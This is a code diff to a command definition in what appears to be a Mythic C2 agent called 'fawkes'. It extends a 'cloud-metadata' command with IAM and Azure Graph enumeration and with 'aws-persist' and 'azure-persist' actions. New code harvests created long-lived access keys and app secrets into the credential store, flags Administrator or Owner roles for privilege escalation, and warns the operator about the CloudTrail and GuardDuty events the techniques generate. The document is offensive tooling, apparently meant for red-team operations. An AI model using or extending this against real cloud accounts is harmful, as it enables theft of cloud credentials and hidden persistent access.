@@ -13,10 +13,10 @@ func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "cloud-metadata",
 		Description:         "Probe cloud instance metadata services (AWS/Azure/GCP/DigitalOcean) for credentials, identity, and configuration. Supports IMDSv2 for AWS.",
-		HelpString:          "cloud-metadata -action detect\ncloud-metadata -action creds\ncloud-metadata -action all -provider aws",
+		HelpString:          "cloud-metadata -action detect\ncloud-metadata -action creds\ncloud-metadata -action all -provider aws\ncloud-metadata -action aws-iam\ncloud-metadata -action azure-graph\ncloud-metadata -action gcp-iam",
 		Version:             1,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1552.005", "T1580"},
+		MitreAttackMappings: []string{"T1552.005", "T1580", "T1526", "T1098.001"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -32,10 +32,10 @@ func init() {
 			{
 				Name:          "action",
 				CLIName:       "action",
-				Description:   "Action to perform: detect, all, creds, identity, userdata, network",
+				Description:   "Action: detect, all, creds, identity, userdata, network, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist",
 				DefaultValue:  "detect",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"detect", "all", "creds", "identity", "userdata", "network"},
+				Choices:       []string{"detect", "all", "creds", "identity", "userdata", "network", "aws-iam", "azure-graph", "gcp-iam", "aws-persist", "azure-persist"},
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
@@ -148,8 +148,103 @@ func init() {
 				}
 			}
 
+			// Extract persist-created credentials (AccessKey + SecretKey from aws-persist output)
+			if strings.Contains(responseText, "SUCCESS: Created") {
+				lines := strings.Split(responseText, "\n")
+				var accessKey, secretKey, account string
+				for _, line := range lines {
+					line = strings.TrimSpace(line)
+					if strings.HasPrefix(line, "AccessKey:") {
+						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKey:"))
+					} else if strings.HasPrefix(line, "SecretKey:") {
+						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretKey:"))
+					} else if strings.HasPrefix(line, "Account:") {
+						account = strings.TrimSpace(strings.TrimPrefix(line, "Account:"))
+					} else if strings.HasPrefix(line, "App ID:") && !strings.Contains(line, "Object") {
+						// Azure app ID
+						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "App ID:"))
+					} else if strings.HasPrefix(line, "Secret:") {
+						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "Secret:"))
+					}
+				}
+				if accessKey != "" && secretKey != "" {
+					provider := "AWS"
+					if strings.Contains(responseText, "Azure") {
+						provider = "Azure"
+					}
+					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+						CredentialType: "key",
+						Realm:          hostname,
+						Account:        fmt.Sprintf("%s Persist (%s)", provider, account),
+						Credential:     fmt.Sprintf("ID=%s Secret=%s", accessKey, secretKey),
+						Comment:        fmt.Sprintf("cloud-metadata %s-persist (long-lived)", strings.ToLower(provider)),
+					})
+				}
+			}
+
 			registerCredentials(processResponse.TaskData.Task.ID, creds)
+
+			// Tag IAM enumeration actions
+			action, _ := processResponse.TaskData.Args.GetStringArg("action")
+			switch action {
+			case "aws-iam":
+				if strings.Contains(responseText, "AdministratorAccess") || strings.Contains(responseText, "PowerUser") {
+					tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
+						"AWS IAM: overprivileged role detected (T1580)")
+				}
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"AWS IAM privilege enumeration (STS+IAM)")
+			case "azure-graph":
+				if strings.Contains(responseText, "Global Administrator") || strings.Contains(responseText, "globalAdmin") {
+					tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
+						"Azure AD: Global Administrator detected (T1580)")
+				}
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"Azure AD Graph enumeration (users, groups, apps)")
+			case "gcp-iam":
+				if strings.Contains(responseText, "roles/owner") || strings.Contains(responseText, "roles/editor") {
+					tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
+						"GCP IAM: Owner/Editor role detected (T1580)")
+				}
+				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
+					"GCP IAM policy enumeration (T1526)")
+			case "aws-persist", "azure-persist":
+				tagTask(processResponse.TaskData.Task.ID, "PERSIST",
+					fmt.Sprintf("Cloud persistence: %s (T1098.001)", action))
+			}
+
 			return response
+		},
+		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
+			action, _ := taskData.Args.GetStringArg("action")
+			msg := "OPSEC WARNING: Querying cloud metadata service at 169.254.169.254 (T1552.005). HTTP requests to metadata endpoints are a well-known credential theft technique. Cloud security monitoring (GuardDuty, Defender for Cloud) specifically watches for metadata service access from unusual processes."
+			switch action {
+			case "aws-iam":
+				msg += " Additionally, AWS IAM API calls (STS, IAM) are logged in CloudTrail and may trigger GuardDuty alerts for unusual API usage patterns."
+			case "azure-graph":
+				msg += " Additionally, Microsoft Graph API calls are logged in Azure AD audit logs and may trigger Defender for Cloud alerts for suspicious managed identity usage."
+			case "gcp-iam":
+				msg += " Additionally, GCP IAM and Cloud Resource Manager API calls are logged in Cloud Audit Logs and may trigger Security Command Center alerts."
+			case "aws-persist":
+				msg += " HIGH RISK: Creating IAM access keys generates CloudTrail events (CreateAccessKey). This is a high-fidelity indicator of credential persistence (T1098.001). GuardDuty and CSPM tools actively alert on unusual CreateAccessKey calls."
+			case "azure-persist":
+				msg += " HIGH RISK: Creating Azure AD app registrations and client secrets generates audit events (Add application, Update application). This is a persistence indicator (T1098.001). Defender for Cloud may alert on managed identity creating app registrations."
+			}
+			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
+				TaskID: taskData.Task.ID, Success: true,
+				OpsecPreBlocked: false,
+				OpsecPreMessage:    msg,
+				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
+		},
+		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
+			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
+				TaskID:              taskData.Task.ID,
+				Success:             true,
+				OpsecPostBlocked:    false,
+				OpsecPostMessage:    "OPSEC AUDIT: Cloud metadata service queried. HTTP requests to 169.254.169.254 are logged by cloud audit trails and may trigger SSRF detection rules. Metadata responses contain IAM credentials.",
+				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
